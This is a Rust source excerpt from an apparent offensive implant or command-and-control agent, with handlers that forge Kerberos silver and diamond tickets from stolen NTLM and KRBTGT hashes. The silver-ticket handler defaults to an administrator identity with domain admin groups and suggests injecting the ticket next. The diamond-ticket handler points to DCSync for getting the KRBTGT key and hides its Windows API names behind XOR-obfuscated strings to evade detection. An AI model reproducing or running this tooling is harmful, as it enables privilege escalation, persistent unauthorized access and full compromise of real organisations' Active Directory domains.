// Forges a TGS for a specific service using the service account's NTLM hash.
// Args: {"domain":"corp.local","sid":"S-1-5-21-A-B-C","service_ntlm":"<hex>",
//        "service":"cifs","target":"fileserver.corp.local",
//        "username":"administrator","user_id":500,"groups":[512,513],"lifetime_hours":10}

#[cfg(target_os = "windows")]
fn cred_silver_ticket(v: &serde_json::Value) -> TaskOutput {
    use base64::Engine;
    let domain = match v.get("domain").and_then(|s| s.as_str()) {
        Some(d) => d.to_uppercase(),
        None    => return TaskOutput::failure("silver-ticket: missing domain"),
    };
    let sid_str = match v.get("sid").and_then(|s| s.as_str()) {
        Some(s) => s,
        None    => return TaskOutput::failure("silver-ticket: missing sid"),
    };
    let svc_hex = match v.get("service_ntlm").and_then(|s| s.as_str()) {
        Some(h) => h,
        None    => return TaskOutput::failure("silver-ticket: missing service_ntlm"),
    };
    let svc_key = match hex_to_bytes(svc_hex) {
        Ok(k) if k.len() == 16 => k,
        Ok(_)  => return TaskOutput::failure("silver-ticket: service_ntlm must be 32 hex chars"),
        Err(e) => return TaskOutput::failure(&format!("silver-ticket: {e}")),
    };
    let service = v.get("service").and_then(|s| s.as_str()).unwrap_or("cifs");
    let target  = match v.get("target").and_then(|s| s.as_str()) {
        Some(t) => t,
        None    => return TaskOutput::failure("silver-ticket: missing target hostname"),
    };
    let domain_sid = match parse_sid(sid_str) {
        Ok(s) => s,
        Err(e) => return TaskOutput::failure(&format!("silver-ticket: {e}")),
    };
    let username = v.get("username").and_then(|s| s.as_str()).unwrap_or("administrator");
    let user_id  = v.get("user_id").and_then(|n| n.as_u64()).unwrap_or(500) as u32;
    let lifetime = v.get("lifetime_hours").and_then(|n| n.as_u64()).unwrap_or(10);
    let groups: Vec<u32> = v.get("groups").and_then(|a| a.as_array())
        .map(|arr| arr.iter().filter_map(|n| n.as_u64().map(|x| x as u32)).collect())
        .unwrap_or_else(|| vec![512, 513]);

    let domain_netbios = domain.split('.').next().unwrap_or(&domain).to_string();
    let now     = current_unix_secs();
    let endtime = now + lifetime * 3600;
    let ft_now  = unix_to_filetime(now);
    let flags: u32 = 0x40a10000; // forwardable, proxiable, renewable, pre-auth

    let mut session_key = [0u8; 16];
    use rand::RngCore;
    rand::rngs::OsRng.fill_bytes(&mut session_key);

    let pac = build_pac(
        username, &domain_netbios, "",
        &domain_sid, user_id, 513, &groups,
        ft_now, &session_key, &svc_key,
    );

    let mut pac_inner = Vec::new();
    pac_inner.extend(kctx(0, &kint(128)));
    pac_inner.extend(kctx(1, &kostr(&pac)));
    let authz = kseq(&kseq(&pac_inner));

    let enc_ticket_plain = build_enc_ticket_part(
        &session_key, &domain, username, flags, now, endtime, Some(&authz),
    );
    let enc_ticket_cipher = rc4hmac_encrypt(&svc_key, 2, &enc_ticket_plain);

    let spn_target = format!("{target}");
    let mut tkt_inner = Vec::new();
    tkt_inner.extend(kctx(0, &kint(5)));
    tkt_inner.extend(kctx(1, &kgstr(&domain)));
    tkt_inner.extend(kctx(2, &build_principal(3, &[service, &spn_target])));
    tkt_inner.extend(kctx(3, &build_enc_data(23, &enc_ticket_cipher)));
    let ticket_der = kapp(1, &kseq(&tkt_inner));

    let enc_cred_plain = build_enc_krb_cred_part(
        &session_key, &domain, username,
        &[service, &spn_target], flags, now, now, endtime,
    );

    let krb_cred = build_krb_cred(&ticket_der, &enc_cred_plain);
    let ticket_b64 = base64::engine::general_purpose::STANDARD.encode(&krb_cred);

    let result = serde_json::json!({
        "status":       "silver ticket constructed",
        "username":     username,
        "domain":       domain,
        "service":      format!("{service}/{spn_target}"),
        "ticket_b64":   ticket_b64,
        "next_step":    "inject via cred/ptt {ticket_b64: \"<value above>\"}",
    });
    TaskOutput::success(serde_json::to_vec(&result).unwrap_or_default())
}

// ── Diamond Ticket ────────────────────────────────────────────────────────────
//
// Requests a legitimate TGT from the KDC (using current credentials),
// then rebuilds it with elevated group memberships using the KRBTGT key.
// If krbtgt_ntlm is not provided, returns info needed to request one externally.
// Args: {"domain":"...","sid":"...","krbtgt_ntlm":"<hex>",
//        "groups":[512,513,518,519,520],"lifetime_hours":10}

#[cfg(target_os = "windows")]
fn cred_diamond_ticket(v: &serde_json::Value) -> TaskOutput {
    let krbtgt_hex = v.get("krbtgt_ntlm").and_then(|s| s.as_str());
    if krbtgt_hex.is_none() {
        // Without KRBTGT key we can't modify the ticket — return what's needed
        return TaskOutput::failure(
            "diamond-ticket: krbtgt_ntlm required. Obtain via cred/dcsync {user:krbtgt}, \
             then provide: domain, sid, krbtgt_ntlm, groups"
        );
    }
    let groups: Vec<u32> = v.get("groups").and_then(|a| a.as_array())
        .map(|arr| arr.iter().filter_map(|n| n.as_u64().map(|x| x as u32)).collect())
        .unwrap_or_else(|| vec![512, 513, 518, 519, 520]);

    // With KRBTGT key available, diamond = golden with current user identity.
    let username = {
        use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
        type GetUserNameWFn = unsafe extern "system" fn(*mut u16, *mut u32) -> i32;
        // advapi32.dll XOR 0x5A
        let adv_n = crate::obfs::dec(&[0x3B,0x3E,0x2C,0x3B,0x2A,0x33,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]);
        let adv = {
            let mut b = crate::loader::get_module_base(adv_n.as_ptr()) as usize;
            if b == 0 { b = unsafe { LoadLibraryA(adv_n.as_ptr()) } as usize; }
            b
        };
        // GetUserNameW XOR 0x5A
        let fn_n = crate::obfs::dec(&[0x1D,0x3F,0x2E,0x0F,0x29,0x3F,0x28,0x14,0x3B,0x37,0x3F,0x0D,0x5A]);
        let f = if adv != 0 { unsafe { crate::loader::get_export_by_name(adv, fn_n.as_ptr()) } } else { None };
        if let Some(p) = f {
            let guw: GetUserNameWFn = unsafe { core::mem::transmute(p) };
            let mut buf = [0u16; 256];
            let mut sz = buf.len() as u32;
            unsafe { guw(buf.as_mut_ptr(), &mut sz) };
            String::from_utf16_lossy(&buf[..(sz.saturating_sub(1)) as usize])
        } else {
            std::env::var("USERNAME").unwrap_or_else(|_| "unknown".to_string())
        }
    };

    // Forward to golden ticket with current user context
    let mut gv = v.clone();
    if let Some(obj) = gv.as_object_mut() {
        obj.insert("method".to_string(), serde_json::Value::String("golden-ticket".to_string()));
        obj.entry("username").or_insert_with(|| serde_json::Value::String(username.clone()));
        obj.entry("groups").or_insert_with(|| {
            serde_json::Value::Array(groups.iter().map(|&g| serde_json::json!(g)).collect())
        });
        obj.insert("krbtgt_ntlm".to_string(),
            serde_json::Value::String(krbtgt_hex.unwrap().to_string()));
    }
    let golden = cred_golden_ticket(&gv);
    let data = golden.data.clone();
    if let Ok(mut j) = serde_json::from_slice::<serde_json::Value>(&data) {
        if let Some(obj) = j.as_object_mut() {
            obj.insert("status".to_string(),
                serde_json::Value::String(
                    "diamond ticket constructed (elevated golden ticket with current-user identity)"
                    .to_string()));
            obj.insert("current_user".to_string(),
                serde_json::Value::String(username));
        }
        return TaskOutput::success(serde_json::to_vec(&j).unwrap_or_default());
    }
    golden
}
